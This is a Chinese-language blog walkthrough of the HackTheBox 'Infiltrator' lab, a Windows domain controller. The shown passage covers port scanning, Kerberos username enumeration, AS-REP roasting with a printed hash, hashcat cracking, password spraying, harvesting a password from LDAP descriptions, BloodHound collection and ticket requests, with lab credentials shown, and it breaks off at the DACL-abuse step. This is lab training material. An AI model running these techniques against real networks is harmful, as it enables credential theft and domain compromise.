<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Infiltrator - HackTheBox | 喵喵喵喵 | 愚かな人間</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Infiltrator 10.10.11.31                                                                                                              端口扫描80和一些常规域端口： 1234567891">
<meta property="og:type" content="article">
<meta property="og:title" content="Infiltrator - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2024/09/02/Infiltrator-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Infiltrator 10.10.11.31                                                                                                              端口扫描80和一些常规域端口： 1234567891">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090201.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090202.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090203.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090204.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090205.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090206.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090207.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090208.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090209.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090210.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090211.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090213.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090212.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090214.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090215.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090216.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090217.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090218.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090219.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090221.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090220.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090222.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090223.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090224.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090225.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090226.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090227.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090228.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090229.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090230.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090231.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090232.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090233.jpg">
<meta property="article:published_time" content="2024-09-02T10:52:54.000Z">
<meta property="article:modified_time" content="2025-06-16T04:57:21.705Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090201.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:Discord@darkwing_nya" title="Discord@darkwing_nya" class="mail">Discord@darkwing_nya</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Infiltrator - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Infiltrator - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2024-09-02T10:52:54.000Z" itemprop="datePublished" class="page-time">
  2024-09-02
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#users-txt"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">users.txt</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#users"><span class="post-toc-number">3.</span> <span class="post-toc-text">users</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#asreproast"><span class="post-toc-number">4.</span> <span class="post-toc-text">asreproast</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#smb"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">smb</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LDAP"><span class="post-toc-number">5.</span> <span class="post-toc-text">LDAP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#bloodhound"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">bloodhound</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#d-anderson"><span class="post-toc-number">6.</span> <span class="post-toc-text">d.anderson</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#GenericAll"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">GenericAll</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Shadow-Credentials"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">Shadow Credentials</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#E-RODRIGUEZ"><span class="post-toc-number">7.</span> <span class="post-toc-text">E.RODRIGUEZ</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">8.</span> <span class="post-toc-text">user flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-krb5-conf"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">&#x2F;etc&#x2F;krb5.conf</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#OutputMessengerMysql"><span class="post-toc-number">9.</span> <span class="post-toc-text">OutputMessengerMysql</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#非预期root"><span class="post-toc-number">10.</span> <span class="post-toc-text">非预期root</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#OutputMessenger"><span class="post-toc-number">11.</span> <span class="post-toc-text">OutputMessenger</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#UserExplorer-exe"><span class="post-toc-number">12.</span> <span class="post-toc-text">UserExplorer.exe</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#winrm-svc-py"><span class="post-toc-number">12.1.</span> <span class="post-toc-text">winrm_svc.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#OutputMessenger-API"><span class="post-toc-number">13.</span> <span class="post-toc-text">OutputMessenger API</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#O-martinez"><span class="post-toc-number">14.</span> <span class="post-toc-text">O.martinez</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#network-capture-2024-pcapng"><span class="post-toc-number">14.1.</span> <span class="post-toc-text">network_capture_2024.pcapng</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#BitLocker-backup-7z"><span class="post-toc-number">14.2.</span> <span class="post-toc-text">BitLocker-backup.7z</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#BitLocker"><span class="post-toc-number">15.</span> <span class="post-toc-text">BitLocker</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Backup-Credentials-7z"><span class="post-toc-number">16.</span> <span class="post-toc-text">Backup_Credentials.7z</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#lan-managment"><span class="post-toc-number">17.</span> <span class="post-toc-text">lan_managment</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#gmsa"><span class="post-toc-number">17.1.</span> <span class="post-toc-text">gmsa</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ADCS"><span class="post-toc-number">18.</span> <span class="post-toc-text">ADCS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ESC4"><span class="post-toc-number">18.1.</span> <span class="post-toc-text">ESC4</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">19.</span> <span class="post-toc-text">root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hashdump"><span class="post-toc-number">19.1.</span> <span class="post-toc-text">hashdump</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">20.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Infiltrator-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Infiltrator - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2024-09-02 18:52:54" datetime="2024-09-02T10:52:54.000Z"  itemprop="datePublished">2024-09-02</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://app.hackthebox.com/machines/Infiltrator" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Infiltrator</a></li>
<li>10.10.11.31</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090201.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80和一些常规域端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.31</span></span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-02 14:43 CST</span><br><span class="line">Nmap scan report for 10.10.11.31</span><br><span class="line">Host is up (0.091s latency).</span><br><span class="line">Not shown: 986 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Infiltrator.htb</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-02 06:35:10Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2024-09-02T06:36:30+00:00; -9m57s from scanner time.</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2024-09-02T06:36:30+00:00; -9m57s from scanner time.</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">|_ssl-date: 2024-09-02T06:36:30+00:00; -9m57s from scanner time.</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">|_ssl-date: 2024-09-02T06:36:30+00:00; -9m57s from scanner time.</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: INFILTRATOR</span><br><span class="line">|   NetBIOS_Domain_Name: INFILTRATOR</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: infiltrator.htb</span><br><span class="line">|   DNS_Computer_Name: dc01.infiltrator.htb</span><br><span class="line">|   DNS_Tree_Name: infiltrator.htb</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-09-02T06:35:51+00:00</span><br><span class="line">|_ssl-date: 2024-09-02T06:36:30+00:00; -9m57s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.infiltrator.htb</span><br><span class="line">| Not valid before: 2024-07-30T13:20:17</span><br><span class="line">|_Not valid after:  2025-01-29T13:20:17</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: -9m56s, deviation: 0s, median: -9m57s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-09-02T06:35:55</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 155.20 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>数字市场相关，得到域名INFILTRATOR.HTB,并且页面可以得到一些用户名：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090202.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="users-txt"><a href="#users-txt" class="headerlink" title="users.txt"></a>users.txt</h2><p>根据页面上全名，处理格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">David Anderson</span><br><span class="line">Olivia Martinez</span><br><span class="line">Kevin Turner</span><br><span class="line">Amanda Walker</span><br><span class="line">Marcus Harris</span><br><span class="line">Lauren Clark</span><br><span class="line">Ethan Rodriguez</span><br><span class="line">D.Anderson</span><br><span class="line">O.Martinez</span><br><span class="line">K.Turner</span><br><span class="line">A.Walker</span><br><span class="line">M.Harris</span><br><span class="line">L.Clark</span><br><span class="line">E.Rodriguez</span><br></pre></td></tr></table></figure>

<h1 id="users"><a href="#users" class="headerlink" title="users"></a>users</h1><p>根据上面得到的用户名列表枚举有效用户名：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_darwin_amd64 userenum --dc 10.10.11.31 -d INFILTRATOR.HTB users.txt</span><br><span class="line"></span><br><span class="line">2024/09/02 14:55:56 &gt;  [+] VALID USERNAME:	 O.Martinez@INFILTRATOR.HTB</span><br><span class="line">2024/09/02 14:55:56 &gt;  [+] VALID USERNAME:	 K.Turner@INFILTRATOR.HTB</span><br><span class="line">2024/09/02 14:55:56 &gt;  [+] VALID USERNAME:	 D.Anderson@INFILTRATOR.HTB</span><br><span class="line">2024/09/02 14:55:56 &gt;  [+] VALID USERNAME:	 M.Harris@INFILTRATOR.HTB</span><br><span class="line">2024/09/02 14:55:56 &gt;  [+] VALID USERNAME:	 A.Walker@INFILTRATOR.HTB</span><br><span class="line">2024/09/02 14:55:56 &gt;  [+] VALID USERNAME:	 E.Rodriguez@INFILTRATOR.HTB</span><br><span class="line">2024/09/02 14:55:56 &gt;  [+] VALID USERNAME:	 L.Clark@INFILTRATOR.HTB</span><br></pre></td></tr></table></figure>

<h1 id="asreproast"><a href="#asreproast" class="headerlink" title="asreproast"></a>asreproast</h1><p>然后在只有用户名的情况下，常规的roast发现L.Clark可以asreproast：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 examples/GetNPUsers.py infiltrator.htb/ -dc-ip 10.10.11.31 -usersfile users.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">krb5asrep<span class="variable">$23</span><span class="variable">$L</span>.Clark@INFILTRATOR.HTB:40a0cc17b461622c2be236b060bf0092<span class="variable">$8328355d3cfe7523332253a9ecf0cf0e8c0cd2aabaa902910cd8e5cd4683ffebb3529c50054683ee2ede110773c9c8bfa28ffb44c54bb122846374fa652ef88f6c3d2066d19cea8fb352ac0914fa70bb7d9baa80d0025c6dd9d73f7d99ba31a4ff0744ab4e78c2472d36856667358e432605ab6815067338cdacfcae2d7f820f519a12d9d34e9a072cf0ef0667d0d451de9dccaf2be784c783f829ea823863f985461b1b363bac793eccef030c1c16a4a1f537cd411ca42823e1c2001c96246d425222facdebace9aa93969333130c825a37ddbcaaaac9a224e75b522223fb625983edebdce68d0dff1c96e1c88dcaa75fd0</span></span></span><br></pre></td></tr></table></figure>

<p>破解出密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -m 18200 hash.txt ~/Tools/dict/rockyou.txt</span><br><span class="line"></span><br><span class="line">WAT?watismypass!</span><br></pre></td></tr></table></figure>

<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>另外使用这个密码继续枚举发现另外两个用户是STATUS_ACCOUNT_RESTRICTION</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.11.31 -d infiltrator.htb -u users.txt -p 'WAT?watismypass!'</span><br><span class="line"></span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\D.Anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION</span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\M.Harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION</span><br></pre></td></tr></table></figure>



<h1 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h1><p>使用得到的账号密码继续枚举，发现K.turner用户description中的密码：</p>
<ul>
<li>Get User Descriptions | NetExec<br><a href="https://www.netexec.wiki/ldap-protocol/get-user-descriptions" target="_blank" rel="noopener">https://www.netexec.wiki/ldap-protocol/get-user-descriptions</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.11.31 -d infiltrator.htb -u users.txt -p 'WAT?watismypass!' -M get-desc-users</span><br><span class="line"></span><br><span class="line">GET-DESC... 10.10.11.31     389    DC01             User: Administrator description: Built-in account for administering the computer/domain</span><br><span class="line">GET-DESC... 10.10.11.31     389    DC01             User: Guest description: Built-in account for guest access to the computer/domain</span><br><span class="line">GET-DESC... 10.10.11.31     389    DC01             User: krbtgt description: Key Distribution Center Service Account</span><br><span class="line">GET-DESC... 10.10.11.31     389    DC01             User: K.turner description: MessengerApp@Pass!</span><br><span class="line">GET-DESC... 10.10.11.31     389    DC01             User: infiltrator_svc$ description: dc01.infiltrator.htb</span><br></pre></td></tr></table></figure>

<h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>另外也可以收集bloodhound信息分析：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.11.31 -d infiltrator.htb --dns-tcp -c All -u L.Clark -p 'WAT?watismypass!' --zip</span><br></pre></td></tr></table></figure>

<h1 id="d-anderson"><a href="#d-anderson" class="headerlink" title="d.anderson"></a>d.anderson</h1><p>根据bloofhound可以发现从d.anderson开始的路径：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090203.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>前面可以看到d.anderson是STATUS_ACCOUNT_RESTRICTION，可以用kerberos认证绕过这个限制(自己同步时间或者算时差)：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">faketime -f "-8h10m" python3 examples/getTGT.py infiltrator.htb/d.anderson:'WAT?watismypass!' -dc-ip 10.10.11.31</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=./d.anderson.ccache</span><br></pre></td></tr></table></figure>

<h2 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h2><p>d.anderson对MARKETING DIGITAL有GenericAll,就是DACL Abuse：</p>
<ul>
